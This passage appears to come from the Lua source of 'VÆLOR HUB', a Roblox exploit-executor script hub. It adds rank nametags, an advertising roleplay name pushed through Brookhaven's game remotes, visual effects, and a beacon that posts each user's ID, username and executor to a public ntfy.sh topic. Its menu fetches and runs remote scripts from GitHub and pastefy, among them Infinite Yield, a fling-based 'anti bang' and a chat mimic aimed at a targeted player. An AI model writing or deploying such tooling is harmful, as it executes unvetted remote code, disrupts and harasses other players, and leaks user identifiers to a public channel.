end

local function makeHexagonTag(player, rankname)
	local character = player.Character
	local head = character and character:FindFirstChild("Head")
	if not head then
		return
	end
	-- OWNER / ADMIN / VIP tag: har VÆLOR HUB user ko poore server mein (kitni bhi door se) dikhe
	local isStaffTag = rankname == "OWNER" or rankname == "ADMIN" or rankname == "VIP"
	local existing = head:FindFirstChild("HexagonNametag")
	if existing then
		local tagLabel = existing:FindFirstChild("Tag")
		if tagLabel and tagLabel.Text ~= (rankname or "User") then
			tagLabel.Text = rankname or "User"
		end
		-- agar tag disable / chhota / distance-limited ho gaya to wapas theek kar do
		if existing.Enabled ~= true then
			existing.Enabled = true
		end
		if isStaffTag and existing.MaxDistance ~= math.huge then
			existing.MaxDistance = math.huge
		end
		if existing.Parent ~= head then
			existing.Parent = head
		end
		return
	end

	local billboard = Instance.new("BillboardGui")
	billboard.Name = "HexagonNametag"
	billboard.Size = UDim2.new(0, 180, 0, 70)
	billboard.StudsOffset = Vector3.new(0, 4.5, 0)
	billboard.AlwaysOnTop = true
	billboard.MaxDistance = isStaffTag and math.huge or 100 -- staff tag unlimited distance
	billboard.LightInfluence = 0
	billboard.Enabled = true
	billboard.ResetOnSpawn = false
	billboard.Parent = head

	local thumbnail = Instance.new("ImageLabel")
	thumbnail.Name = "Thumbnail"
	thumbnail.Size = UDim2.new(0.187, 0, 0.44, 0)
	thumbnail.Position = UDim2.new(0.5, 0, 0.22, 0)
	thumbnail.AnchorPoint = Vector2.new(0.5, 0.5)
	thumbnail.BackgroundTransparency = 1
	thumbnail.Image = "rbxthumb://type=AvatarHeadShot&id=" .. player.UserId .. "&w=150&h=150"
	thumbnail.Parent = billboard
	local imgCorner = Instance.new("UICorner")
	imgCorner.CornerRadius = UDim.new(1, 0)
	imgCorner.Parent = thumbnail

	local nameTxt = Instance.new("TextLabel")
	nameTxt.Name = "NameTxt"
	nameTxt.Size = UDim2.new(1, 0, 0.273, 0)
	nameTxt.Position = UDim2.new(0, 0, 0.446, 0)
	nameTxt.BackgroundTransparency = 1
	nameTxt.Text = player.DisplayName .. " (@" .. player.Name .. ")"
	nameTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
	nameTxt.TextScaled = true
	nameTxt.Font = Enum.Font.FredokaOne
	nameTxt.TextWrapped = true
	nameTxt.Parent = billboard
	local nameConstraint = Instance.new("UITextSizeConstraint")
	nameConstraint.MaxTextSize = 98
	nameConstraint.Parent = nameTxt
	local nameStroke = Instance.new("UIStroke")
	nameStroke.Thickness = 1.5
	nameStroke.Parent = nameTxt

	local tag = Instance.new("TextLabel")
	tag.Name = "Tag"
	tag.Size = UDim2.new(1, 0, 0.246, 0)
	tag.Position = UDim2.new(0, 0, 0.8, 0)
	tag.BackgroundTransparency = 1
	tag.Text = rankname or "User"
	tag.TextColor3 = Color3.fromRGB(255, 255, 255)
	tag.TextScaled = true
	tag.Font = Enum.Font.FredokaOne
	tag.TextWrapped = true
	tag.Parent = billboard
	local tagConstraint = Instance.new("UITextSizeConstraint")
	tagConstraint.MaxTextSize = 74
	tagConstraint.Parent = tag
	local tagStroke = Instance.new("UIStroke")
	tagStroke.Color = Color3.fromRGB(99, 99, 99)
	tagStroke.Thickness = 1.5
	tagStroke.Parent = tag
	local gradient = Instance.new("UIGradient")
	gradient.Name = "NametagGradient"
	gradient.Rotation = 60
	local rankColor = isStaffTag and Library.GetCardColor(player.Name) or nil
	if rankColor then
		-- OWNER purple / ADMIN cyan / VIP pink (same colors as the Users tab card)
		gradient.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, rankColor),
			ColorSequenceKeypoint.new(1, rankColor:Lerp(Color3.new(0, 0, 0), 0.35)),
		})
	else
		gradient.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 200, 200)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(113, 113, 113)),
		})
	end
	gradient.Parent = tag
end

Library.TagHidden = Library.TagHidden or {} -- { OWNER = true, ADMIN = true } = that rank's nametag is hidden

local function applyTag(player)
	local rankName = getRank(player)
	if rankName and Library.TagHidden[rankName] then
		local head = player.Character and player.Character:FindFirstChild("Head")
		local old = head and head:FindFirstChild("HexagonNametag")
		if old then
			old:Destroy()
		end
		return
	end
	if not rankName and player == TagPlayers.LocalPlayer then
		rankName = "User"
	end
	if rankName then
		makeHexagonTag(player, rankName)
	end
end

local function removeAllTags()
	for _, p in ipairs(TagPlayers:GetPlayers()) do
		local head = p.Character and p.Character:FindFirstChild("Head")
		local old = head and head:FindFirstChild("HexagonNametag")
		if old then
			old:Destroy()
		end
	end
end

Library.RefreshTags = function()
	for _, p in ipairs(TagPlayers:GetPlayers()) do
		pcall(applyTag, p)
	end
end

-- Watchdog: tag gayab ho to har 1 second mein wapas laga deta hai
local tagsActive = true
task.spawn(function()
	while tagsActive and not Loader._destroyed do
		for _, p in ipairs(TagPlayers:GetPlayers()) do
			pcall(applyTag, p)
		end
		task.wait(1)
	end
end)

-- instant tag on join / respawn (do not wait for the 1s watchdog)
local tagConns = {}
local function hookTagPlayer(p)
	table.insert(tagConns, p.CharacterAdded:Connect(function()
		for _ = 1, 10 do
			task.wait(0.3)
			pcall(applyTag, p)
		end
	end))
end
for _, p in ipairs(TagPlayers:GetPlayers()) do
	hookTagPlayer(p)
end
table.insert(tagConns, TagPlayers.PlayerAdded:Connect(hookTagPlayer))

Loader:AddCleanup(function()
	tagsActive = false
	for _, c in ipairs(tagConns) do
		c:Disconnect()
	end
	removeAllTags()
end)
end

-- AUTO RP Name + Bio + Red Fade (Brookhaven) ----------------------------------
-- Moved up + retry: pehle ye file ke end mein tha aur remote ka sirf 10s wait karta tha,
-- isliye slow load wale users ke head pe VÆLOR HUB name/bio set nahi hota tha.
task.spawn(function()
	if game.PlaceId ~= 4924922222 then return end -- sirf Brookhaven

	local RP_NAME = "💣ᴠÆʟᴏʀ ʜᴜʙ💣"
	local RP_BIO = "🥀...20+ ꜱᴄʀɪᴘᴛꜱ | ᴍᴜꜱɪᴄ, ᴘʀᴏᴘꜱ, ᴇᴍᴏᴛᴇꜱ & ᴍᴏʀᴇ...🥀"

	local RS = game:GetService("ReplicatedStorage")
	local RE
	for _ = 1, 90 do -- up to ~90 seconds for the game to finish loading
		RE = RS:FindFirstChild("RE")
		if RE and RE:FindFirstChild("1RPNam1eTex1t") and RE:FindFirstChild("1RPNam1eColo1r") then
			break
		end
		RE = nil
		task.wait(1)
	end
	if not RE then
		pcall(function()
			Loader:Log("RP name remote not found (game may have renamed it)", "Warning")
		end)
		return
	end

	local function setRP()
		pcall(function()
			RE["1RPNam1eTex1t"]:FireServer("RolePlayName", RP_NAME)
			RE["1RPNam1eTex1t"]:FireServer("RolePlayBio", RP_BIO)
		end)
	end
	setRP()

	local rpActive = true
	Loader:AddCleanup(function()
		rpActive = false
	end)

	local red = Color3.fromRGB(255, 0, 0)
	local dark = Color3.fromRGB(100, 0, 0)
	local t0 = os.clock()
	local retried = false -- name/bio sirf ek extra baar set hoga (20s baad)
	local startedAt = os.clock()

	while rpActive and not Loader._destroyed do
		-- red -> dark red -> red, loop
		local a = (1 - math.cos((os.clock() - t0) * 2)) / 2
		local color = red:Lerp(dark, a)
		pcall(function()
			RE["1RPNam1eColo1r"]:FireServer("PickingRPNameColor", color)
			RE["1RPNam1eColo1r"]:FireServer("PickingRPBioColor", color)
		end)
		-- 20 second baad name/bio ek hi baar dobara set (phir nahi)
		if not retried and os.clock() - startedAt >= 20 then
			retried = true
			setRP()
		end
		task.wait(0.4)
	end
end)

--==================================================================================================
-- HUB USERS IN THIS SERVER: only people running VÆLOR HUB in your Roblox server get a card
-- How: every hub user posts a small "I'm here" beacon (user id, username, display name) to a
-- public topic on ntfy.sh that is named after the server (JobId), and reads the beacons of that
-- same topic. No server of your own is needed.
--==================================================================================================
local HUB_BASE_URL = "https://ntfy.sh/"
local HUB_TOPIC = "vaelor-hub-" .. ((game.JobId ~= "" and game.JobId) or tostring(game.PlaceId))
local HUB_HEARTBEAT = 30 -- seconds between "I'm here" beacons
local HUB_POLL = 10 -- seconds between checks
local HUB_TTL = 75 -- a user disappears if no beacon arrived for this long
local MAX_HUB_CARDS = 40

local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
local HubCards, HubCount, hubActive = {}, 0, true

Users:CreateSection({ Text = "VÆLOR Users In This Server" })
local HubStat = Users:CreateStat({ Name = "VÆLOR users in server", Value = "Connecting..." })

local function refreshHubStat()
	HubStat:SetValue(tostring(HubCount + 1), InfoTheme.Success) -- +1 = you
end

local function hubPublish(kind)
	if not httpRequest then
		return
	end
	pcall(httpRequest, {
		Url = HUB_BASE_URL .. HUB_TOPIC,
		Method = "POST",
		Headers = { ["Content-Type"] = "text/plain" },
		Body = InfoHttp:JSONEncode({
			k = kind,
			uid = LocalPlayer.UserId,
			name = LocalPlayer.Name,
			display = LocalPlayer.DisplayName,
			ex = Library.GetExecutorName(),
		}),
	})
end

local function addHubUser(info)
	local uid = info.uid
	if HubCards[uid] or HubCount >= MAX_HUB_CARDS then
		return
	end
	local card = Users:CreateUserCard({
		Title = Library.GetCardTitle(info.name),
		Color = Library.GetCardColor(info.name),
		Sort = ({ OWNER = 0, ADMIN = 500, VIP = 700 })[Library.GetCardTitle(info.name)] or 1000,
		DisplayName = info.display,
		Executor = info.executor,
		Username = info.name,
		Image = "rbxthumb://type=AvatarHeadShot&id=" .. uid .. "&w=150&h=150",
	})
	if card then
		HubCards[uid] = card
		HubCount += 1
	end
end

local function removeHubUser(uid)
	local card = HubCards[uid]
	if card then
		card.Remove()
		HubCards[uid] = nil
		HubCount -= 1
	end
end

local function hubPoll()
	local ok, res = pcall(httpRequest, {
		Url = HUB_BASE_URL .. HUB_TOPIC .. "/json?poll=1&since=90s",
		Method = "GET",
	})
	if not ok or type(res) ~= "table" or type(res.Body) ~= "string" then
		HubStat:SetValue("Offline (request failed)", InfoTheme.Warning)
		return
	end

	local latest, ref = {}, 0
	for line in string.gmatch(res.Body, "[^\r\n]+") do
		local okLine, event = pcall(InfoHttp.JSONDecode, InfoHttp, line)
		if okLine and type(event) == "table" and event.event == "message" and type(event.message) == "string" then
			local okMsg, data = pcall(InfoHttp.JSONDecode, InfoHttp, event.message)
			local t = tonumber(event.time) or 0
			local uid = okMsg and type(data) == "table" and tonumber(data.uid)
			if uid and (data.k == "here" or data.k == "bye") then
				ref = math.max(ref, t)
				local prev = latest[uid]
				if not prev or t > prev.time or (t == prev.time and data.k == "bye") then
					latest[uid] = {
						uid = uid,
						kind = data.k,
						time = t,
						name = string.sub(tostring(data.name or "?"), 1, 30),
						display = string.sub(tostring(data.display or data.name or "?"), 1, 40),
						executor = string.sub(tostring(data.ex or "Unknown"), 1, 30),
					}
				end
			end
		end
	end

	local present = {}
	for uid, info in pairs(latest) do
		if uid ~= LocalPlayer.UserId and info.kind == "here" and ref - info.time <= HUB_TTL then
			present[uid] = info
		end
	end
	for uid in pairs(HubCards) do
		if not present[uid] then
			removeHubUser(uid)
		end
	end
	local added = 0
	for uid, info in pairs(present) do
		if not HubCards[uid] then
			addHubUser(info)
			added += 1
			if added % 5 == 0 then
				task.wait() -- spread card creation over frames (no lag spike)
			end
		end
	end
	refreshHubStat()
end

task.spawn(function()
	if not httpRequest then
		HubStat:SetValue("Offline (executor has no HTTP)", InfoTheme.Warning)
		return
	end
	hubPublish("here")
	local sinceBeacon, sincePoll = 0, HUB_POLL
	while hubActive and not Loader._destroyed do
		if sincePoll >= HUB_POLL then
			sincePoll = 0
			pcall(hubPoll)
		end
		if sinceBeacon >= HUB_HEARTBEAT then
			sinceBeacon = 0
			hubPublish("here")
		end
		task.wait(1)
		sinceBeacon += 1
		sincePoll += 1
	end
end)

Loader:AddCleanup(function()
	hubActive = false
	task.spawn(hubPublish, "bye")
end)

-- Notification when the OWNER or an ADMIN joins your server
do
	local rankJoinConn = InfoPlayers.PlayerAdded:Connect(function(player)
		if player == LocalPlayer then
			return
		end
		local rank = Library.GetCardTitle(player.Name)
		if rank == "OWNER" or rank == "ADMIN" then
			Loader:Notify({
				Title = rank .. " JOINED THE SERVER",
				Content = player.DisplayName .. " (@" .. player.Name .. ")",
				Type = "Info",
				Duration = 6,
			})
		end
	end)
	Loader:AddCleanup(function()
		rankJoinConn:Disconnect()
	end)
end

--==================================================================================================
-- Universal tabs (appear in any game)
--==================================================================================================
local Universal = Loader:CreateTab("Universal", { Search = true })

Universal:CreateLabel({ Text = "Scripts available in any game" })

Universal:CreateScript({
	Name = "VÆLOR EMOTE PANEL",
	Description = "Play any emote instantly from a searchable panel",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAELOR-EMOTE-PANEL/main/V%C3%86LOR%20EMOTE%20PANEL%20BY%20N0T_Z0RO100")
	end,
})

Universal:CreateScript({
	Name = "VÆLOR SHIFT LOCK",
	Description = "Lightweight Roblox Shift Lock script with smooth camera control",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAELOR-SHIFT-LOCK/main/V%C3%86LOR%20SHIFT%20LOCKKKK")
	end,
})

Universal:CreateScript({
	Name = "VÆLOR ANTI BANG",
	Description = "360° ANTI BANG, Anyone banging the user will get flinged",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAELOR-ANTI-BANG/main/V%C3%86LOR%20360%C2%B0%20ANTI%20BANG")
	end,
})

Universal:CreateScript({
	Name = "VÆLOR CHAT MIMIC",
	Description = "Mimic's the chat of that player you trageted",
	Callback = function()
		RunUrl("https://pastefy.app/RoMygs6Y/raw")
	end,
})

Universal:CreateScript({
	Name = "VÆLOR UGC ANIMATION",
	Description = "Use UGC animation packs on your character in any game",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAELOR-EMOTE-PANEL-V2/main/V%C3%86LOR%20EMOTE%20PANEL%20V2")
	end,
})

Universal:CreateScript({
	Name = "INFINITE YIELD",
	Description = "Powerful Roblox admin script packed with useful commands",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
	end,
})

Universal:CreateScript({
	Name = "VÆLOR Fly Ui",
	Description = "Fly anywhere with a simple on-screen control panel",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAELOR-FLY-UI/main/V%C3%86LOR%20FLY%20UI")
	end,
})

--==================================================================================================
-- EFFECTS TAB (JJK / Naruto style visuals) — all effects are client-side (only you see them)
--==================================================================================================
do
	local Players = game:GetService("Players")
	local Lighting = game:GetService("Lighting")
	local RunService = game:GetService("RunService")
	local TweenService = game:GetService("TweenService")
	local Debris = game:GetService("Debris")
	local lp = Players.LocalPlayer

	local FX = Loader:CreateTab("Effects")

	local fxFolder = Instance.new("Folder")
	fxFolder.Name = "VAELOR_FX"
	fxFolder.Parent = workspace
	Loader:AddCleanup(fxFolder)

	-- Helpers ----------------------------------------------------------------------------------
	local function root()
		local c = lp.Character
		return c and c:FindFirstChild("HumanoidRootPart")
	end

	local function tween(inst, t, props, style)
		local tw = TweenService:Create(inst, TweenInfo.new(t, style or Enum.EasingStyle.Quad), props)
		tw:Play()
		return tw
	end

	local function newPart(props)
		local p = Instance.new("Part")
		p.Anchored = true
		p.CanCollide = false
		p.CanQuery = false
		p.CanTouch = false
		p.CastShadow = false
		p.Material = Enum.Material.Neon
		p.TopSurface = Enum.SurfaceType.Smooth
		p.BottomSurface = Enum.SurfaceType.Smooth
		for k, v in pairs(props) do
			p[k] = v
		end
		p.Parent = fxFolder
		return p
	end

	local function notify(title, text, kind)
		Loader:Notify({ Title = title, Content = text, Type = kind or "Info", Duration = 3 })
	end

	-- Calls update(t, dt) every frame for `duration` seconds, then cleanup(). Errors are reported, not hidden.
	local function runFx(duration, update, cleanup)
		local t = 0
		local conn
		local function finish()
			if conn then
				conn:Disconnect()
				conn = nil
			end
			if cleanup then
				local ok, err = pcall(cleanup)
				if not ok then warn("[FX] cleanup error: " .. tostring(err)) end
			end
		end
		conn = RunService.Heartbeat:Connect(function(dt)
			if not conn then return end
			t += dt
			if t >= duration then
				finish()
				return
			end
			local ok, err = pcall(update, t, dt)
			if not ok then
				warn("[FX] error: " .. tostring(err))
				pcall(function() Loader:Log("FX error: " .. tostring(err), "Error") end)
				finish()
			end
		end)
	end

	local function fadeOut(part, t)
		if not part or not part.Parent then return end
		tween(part, t, { Transparency = 1 })
		Debris:AddItem(part, t + 0.1)
	end

	-- Sounds -----------------------------------------------------------------------------------
	-- Built-in Roblox sounds (work in every game). To use your own, replace any value with "rbxassetid://ID".
	local SoundService = game:GetService("SoundService")
	local SOUNDS = {
		boom = "rbxasset://sounds/impact_explosion_03.mp3",
		bass = "rbxasset://sounds/bass.mp3",
		whoosh = "rbxasset://sounds/Rocket whoosh 01.wav",
		shot = "rbxasset://sounds/Rocket shot.wav",
		slash = "rbxasset://sounds/swordslash.wav",
		unsheath = "rbxasset://sounds/unsheath.wav",
		snap = "rbxasset://sounds/snap.mp3",
		ping = "rbxasset://sounds/electronicpingshort.wav",
		victory = "rbxasset://sounds/victory.wav",
		button = "rbxasset://sounds/button.wav",
	}
	local soundOn = true
	local soundVolume = 1

	-- opts: Volume, Pitch, Loop, Time (auto stop after seconds). Returns the Sound (call :Stop() to end early)
	local function playSound(key, opts)
		if not soundOn then return nil end
		opts = opts or {}
		local ok, snd = pcall(function()
			local sd = Instance.new("Sound")
			sd.SoundId = SOUNDS[key] or key
			sd.Volume = (opts.Volume or 1) * soundVolume
			sd.PlaybackSpeed = opts.Pitch or 1
			sd.Looped = opts.Loop or false
			sd.Parent = SoundService
			sd:Play()
			if opts.Loop then
				if opts.Time then
					task.delay(opts.Time, function()
						if sd.Parent then
							tween(sd, 1.2, { Volume = 0 })
							Debris:AddItem(sd, 1.3)
						end
					end)
				end
			else
				sd.Ended:Once(function() sd:Destroy() end)
				Debris:AddItem(sd, opts.Time or 12)
			end
			return sd
		end)
		return ok and snd or nil
	end

	-- Lighting ambience (domain / shrine / heaven / blackout share this, restored automatically) --
	-- Many games rewrite Lighting every frame (day/night cycle etc.), so the values are re-applied
	-- every frame while an ambience is active, and the game's own Sky can be hidden (hideSky).
	local baseLighting
	local ambienceObjs = {}
	local hiddenSkies = {}
	local ambToken = 0
	local ambConn
	local LIGHT_KEYS = { "Brightness", "ClockTime", "Ambient", "OutdoorAmbient", "FogColor", "FogStart", "FogEnd", "ExposureCompensation" }

	local function restoreSkies()
		for _, s in ipairs(hiddenSkies) do
			pcall(function() s.Parent = Lighting end)
		end
		table.clear(hiddenSkies)
	end

	local function stopEnforce()
		if ambConn then
			ambConn:Disconnect()
			ambConn = nil
		end
	end

	local function destroyAmbObjs()
		for _, o in ipairs(ambienceObjs) do
			pcall(function() o:Destroy() end)
		end
		table.clear(ambienceObjs)
	end

	local function clearAmbience(fade)
		stopEnforce()
		destroyAmbObjs()
		restoreSkies()
		if baseLighting then
			local b = baseLighting
			baseLighting = nil
			pcall(tween, Lighting, fade or 1, b)
		end
	end

	local function beginAmbience(props, fade, hideSky)
		fade = fade or 1
		ambToken += 1
		if baseLighting == nil then
			baseLighting = {}
			for _, k in ipairs(LIGHT_KEYS) do
				baseLighting[k] = Lighting[k]
			end
		end
		stopEnforce()
		destroyAmbObjs()
		restoreSkies()
		if hideSky then
			for _, c in ipairs(Lighting:GetChildren()) do
				if c:IsA("Sky") then
					table.insert(hiddenSkies, c)
					c.Parent = nil
				end
			end
		end
		tween(Lighting, fade, props)
		local startAt = os.clock() + fade
		ambConn = RunService.Heartbeat:Connect(function()
			if os.clock() < startAt then return end
			for k, v in pairs(props) do
				pcall(function() Lighting[k] = v end)
			end
		end)
		return ambToken
	end

	local function addLightingObj(class, props)
		local o = Instance.new(class)
		for k, v in pairs(props) do
			o[k] = v
		end
		o.Parent = Lighting
		table.insert(ambienceObjs, o)
		return o
	end

	-- plain black sky (optionally with stars)
	local function addDarkSky(stars)
		return addLightingObj("Sky", {
			SkyboxBk = "", SkyboxDn = "", SkyboxFt = "", SkyboxLf = "", SkyboxRt = "", SkyboxUp = "",
			StarCount = stars or 0, CelestialBodiesShown = false,
		})
	end

	local function endAmbienceAfter(token, seconds)
		task.delay(seconds, function()
			if ambToken == token then
				clearAmbience(1.5)
			end
		end)
	end

	-- 1) GOJO — DOMAIN EXPANSION: INFINITE VOID -----------------------------------------------
	local function gojoDomain()
		local hrp = root()
		if not hrp then return notify("Infinite Void", "Character not found", "Error") end
		local center = hrp.Position
		local token = beginAmbience({
			Brightness = 0, ClockTime = 0, Ambient = Color3.new(0, 0, 0),
			OutdoorAmbient = Color3.new(0, 0, 0), FogColor = Color3.new(0, 0, 0),
			FogStart = 0, FogEnd = 700, ExposureCompensation = 0,
		}, 0.6, true)
		addDarkSky(4000)
		addLightingObj("ColorCorrectionEffect", { Saturation = -0.85, Contrast = 0.35, TintColor = Color3.fromRGB(215, 225, 255) })
		addLightingObj("BloomEffect", { Intensity = 1.2, Size = 40, Threshold = 0.8 })

		-- black room made of 6 thin slabs (an inverted sphere mesh was invisible in many games);
		-- their inner faces are visible from inside
		local R = 150
		local walls = {}
		local function wall(offset, size)
			local w = newPart({
				Size = size, Color = Color3.new(0, 0, 0), Material = Enum.Material.SmoothPlastic,
				Position = center + offset, Transparency = 1,
			})
			tween(w, 0.8, { Transparency = 0 })
			table.insert(walls, w)
		end
		wall(Vector3.new(R, 0, 0), Vector3.new(1, R * 2, R * 2))
		wall(Vector3.new(-R, 0, 0), Vector3.new(1, R * 2, R * 2))
		wall(Vector3.new(0, R, 0), Vector3.new(R * 2, 1, R * 2))
		wall(Vector3.new(0, -R, 0), Vector3.new(R * 2, 1, R * 2))
		wall(Vector3.new(0, 0, R), Vector3.new(R * 2, R * 2, 1))
		wall(Vector3.new(0, 0, -R), Vector3.new(R * 2, R * 2, 1))

		local ring = newPart({
			Shape = Enum.PartType.Cylinder, Size = Vector3.new(0.2, 2, 2), Color = Color3.fromRGB(190, 210, 255),
			CFrame = CFrame.new(center - Vector3.new(0, 2.9, 0)) * CFrame.Angles(0, 0, math.rad(90)), Transparency = 0.3,
		})
		tween(ring, 1.2, { Size = Vector3.new(0.2, 60, 60), Transparency = 1 })
		Debris:AddItem(ring, 1.4)

		local stars = {}
		local colors = { Color3.new(1, 1, 1), Color3.fromRGB(150, 190, 255), Color3.fromRGB(200, 150, 255) }
		for i = 1, 140 do
			local dir = Vector3.new(math.random() - 0.5, math.random() - 0.5, math.random() - 0.5)
			if dir.Magnitude < 0.05 then dir = Vector3.new(1, 0, 0) end
			local offset = dir.Unit * math.random(25, 140)
			local s = newPart({
				Size = Vector3.new(0.6, 0.6, math.random(2, 14) / 2 + 0.5),
				Color = colors[math.random(1, #colors)], Position = center + offset,
			})
			table.insert(stars, { part = s, offset = offset })
		end

		runFx(14, function(t)
			local rot = CFrame.new(center) * CFrame.Angles(t * 0.15, t * 0.25, 0)
			for _, st in ipairs(stars) do
				local p = (rot * CFrame.new(st.offset)).Position
				if (p - center).Magnitude > 0.5 then
					st.part.CFrame = CFrame.lookAt(p, center)
				end
			end
		end, function()
			for _, w in ipairs(walls) do fadeOut(w, 1.2) end
			for _, st in ipairs(stars) do fadeOut(st.part, 1.2) end
		end)
		endAmbienceAfter(token, 14)
		playSound("boom", { Volume = 1, Pitch = 0.6 })
		playSound("bass", { Volume = 0.8, Pitch = 0.5, Loop = true, Time = 14 })
		task.delay(0.4, function() playSound("whoosh", { Volume = 0.8, Pitch = 0.4 }) end)
		notify("Domain Expansion", "Infinite Void", "Success")
	end

	-- 2) GOJO — HOLLOW PURPLE ---------------------------------------------------------------------
	local function hollowPurple()
		local hrp = root()
		if not hrp then return notify("Hollow Purple", "Character not found", "Error") end
		local cf = hrp.CFrame
		local origin = cf * CFrame.new(0, 3, -7)

		local function orb(color, size, pos)
			local o = newPart({ Shape = Enum.PartType.Ball, Size = Vector3.new(size, size, size), Color = color, Position = pos })
			local l = Instance.new("PointLight")
			l.Color = color
			l.Range = 35
			l.Brightness = 5
			l.Parent = o
			return o
		end

		playSound("ping", { Volume = 0.9, Pitch = 0.6 })
		playSound("bass", { Volume = 0.7, Pitch = 1.6, Loop = true, Time = 1.8 })
		local blue = orb(Color3.fromRGB(60, 120, 255), 3, (origin * CFrame.new(-9, 0, 0)).Position)
		local red = orb(Color3.fromRGB(255, 40, 40), 3, (origin * CFrame.new(9, 0, 0)).Position)

		runFx(1.8, function(t)
			local a = t / 1.8
			local off = 9 * (1 - a)
			local wob = math.sin(t * 14) * 0.6 * (1 - a)
			blue.Position = (origin * CFrame.new(-off, wob, 0)).Position
			red.Position = (origin * CFrame.new(off, -wob, 0)).Position
			local s = 3 + a * 3
			blue.Size = Vector3.new(s, s, s)
			red.Size = Vector3.new(s, s, s)
		end, function()
			blue:Destroy()
			red:Destroy()

			playSound("boom", { Volume = 1, Pitch = 0.8 })
			playSound("shot", { Volume = 1, Pitch = 0.5 })
			playSound("whoosh", { Volume = 0.8, Pitch = 0.5, Loop = true, Time = 3 })
			local purple = orb(Color3.fromRGB(175, 60, 255), 16, origin.Position)
			local core = newPart({ Shape = Enum.PartType.Ball, Size = Vector3.new(9, 9, 9), Color = Color3.fromRGB(235, 200, 255), Position = origin.Position })

			local ring = newPart({
				Shape = Enum.PartType.Cylinder, Size = Vector3.new(0.5, 4, 4), Color = Color3.fromRGB(190, 110, 255),
				CFrame = origin * CFrame.Angles(0, math.rad(90), 0), Transparency = 0.2,
			})
			tween(ring, 1, { Size = Vector3.new(0.5, 90, 90), Transparency = 1 })
			Debris:AddItem(ring, 1.2)

			local pos = origin.Position
			local dir = cf.LookVector
			local acc = 0
			runFx(3.2, function(t, dt)
				pos += dir * 150 * dt
				purple.Position = pos
				core.Position = pos
				local s = 16 + math.sin(t * 20) * 1.5
				purple.Size = Vector3.new(s, s, s)
				acc += dt
				if acc > 0.03 then
					acc = 0
					local g = newPart({
						Shape = Enum.PartType.Ball, Size = Vector3.new(10, 10, 10),
						Color = Color3.fromRGB(150, 50, 230), Position = pos, Transparency = 0.4,
					})
					tween(g, 0.6, { Transparency = 1, Size = Vector3.new(2, 2, 2) })
					Debris:AddItem(g, 0.7)
				end
			end, function()
				playSound("boom", { Volume = 1, Pitch = 0.5 })
				tween(purple, 0.4, { Size = Vector3.new(60, 60, 60), Transparency = 1 })
				tween(core, 0.4, { Size = Vector3.new(30, 30, 30), Transparency = 1 })
				Debris:AddItem(purple, 0.5)
				Debris:AddItem(core, 0.5)
			end)
		end)
		notify("Hollow Purple", "Technique: Purple", "Success")
	end

	-- 3) SUKUNA — DOMAIN EXPANSION: MALEVOLENT SHRINE -----------------------------------------------
	local function malevolentShrine()
		local hrp = root()
		if not hrp then return notify("Malevolent Shrine", "Character not found", "Error") end
		local ground = hrp.Position - Vector3.new(0, 3, 0)
		local token = beginAmbience({
			Brightness = 1, ClockTime = 0, Ambient = Color3.fromRGB(90, 0, 0),
			OutdoorAmbient = Color3.fromRGB(70, 0, 0), FogColor = Color3.fromRGB(60, 0, 0), FogStart = 0, FogEnd = 450,
		}, 0.8, true)
		addDarkSky(0)
		addLightingObj("ColorCorrectionEffect", { Saturation = 0.2, Contrast = 0.2, TintColor = Color3.fromRGB(255, 150, 150) })

		local built = {}
		local function build(size, color, mat, offset)
			local p = newPart({ Size = size, Color = color, Material = mat })
			local target = CFrame.new(ground + offset)
			p.CFrame = target * CFrame.new(0, -70, 0)
			tween(p, 1.4, { CFrame = target }, Enum.EasingStyle.Back)
			table.insert(built, p)
			return p
		end

		playSound("boom", { Volume = 1, Pitch = 0.5 })
		playSound("bass", { Volume = 0.8, Pitch = 0.45, Loop = true, Time = 12 })
		task.delay(0.8, function() playSound("unsheath", { Volume = 1, Pitch = 0.6 }) end)
		local dark = Color3.fromRGB(35, 10, 10)
		local wood = Color3.fromRGB(70, 18, 18)
		build(Vector3.new(110, 1, 110), Color3.fromRGB(25, 8, 8), Enum.Material.Slate, Vector3.new(0, 0.1, 0))
		build(Vector3.new(26, 3, 26), dark, Enum.Material.Slate, Vector3.new(0, 1.5, 0))
		for _, c in ipairs({ { -10, -10 }, { 10, -10 }, { -10, 10 }, { 10, 10 } }) do
			build(Vector3.new(2.4, 22, 2.4), wood, Enum.Material.Wood, Vector3.new(c[1], 14, c[2]))
		end
		build(Vector3.new(38, 2, 38), dark, Enum.Material.Slate, Vector3.new(0, 26, 0))
		build(Vector3.new(26, 2, 26), wood, Enum.Material.Slate, Vector3.new(0, 29, 0))
		build(Vector3.new(14, 2, 14), dark, Enum.Material.Slate, Vector3.new(0, 32, 0))
		build(Vector3.new(38.4, 0.4, 38.4), Color3.fromRGB(255, 30, 30), Enum.Material.Neon, Vector3.new(0, 24.8, 0))
		for i = 1, 10 do
			local ang = (i / 10) * math.pi * 2
			build(Vector3.new(3, 40, 3), wood, Enum.Material.Wood, Vector3.new(math.cos(ang) * 48, 21, math.sin(ang) * 48))
		end

		local acc = 0
		runFx(12, function(t, dt)
			acc += dt
			if acc > 0.04 then
				acc = 0
				local rp = ground + Vector3.new(math.random(-70, 70), math.random(2, 35), math.random(-70, 70))
				local len = math.random(25, 70)
				local col = (math.random() > 0.5) and Color3.new(1, 1, 1) or Color3.fromRGB(255, 40, 40)
				local rot = CFrame.Angles(math.rad(math.random(0, 360)), math.rad(math.random(0, 360)), math.rad(math.random(0, 360)))
				local slash = newPart({ Size = Vector3.new(0.25, 0.25, len), Color = col, CFrame = CFrame.new(rp) * rot })
				if math.random() > 0.45 then
					playSound("slash", { Volume = 0.55, Pitch = 0.8 + math.random() * 0.8 })
				end
				tween(slash, 0.3, { Transparency = 1 })
				Debris:AddItem(slash, 0.4)
			end
		end, function()
			playSound("boom", { Volume = 0.7, Pitch = 0.4 })
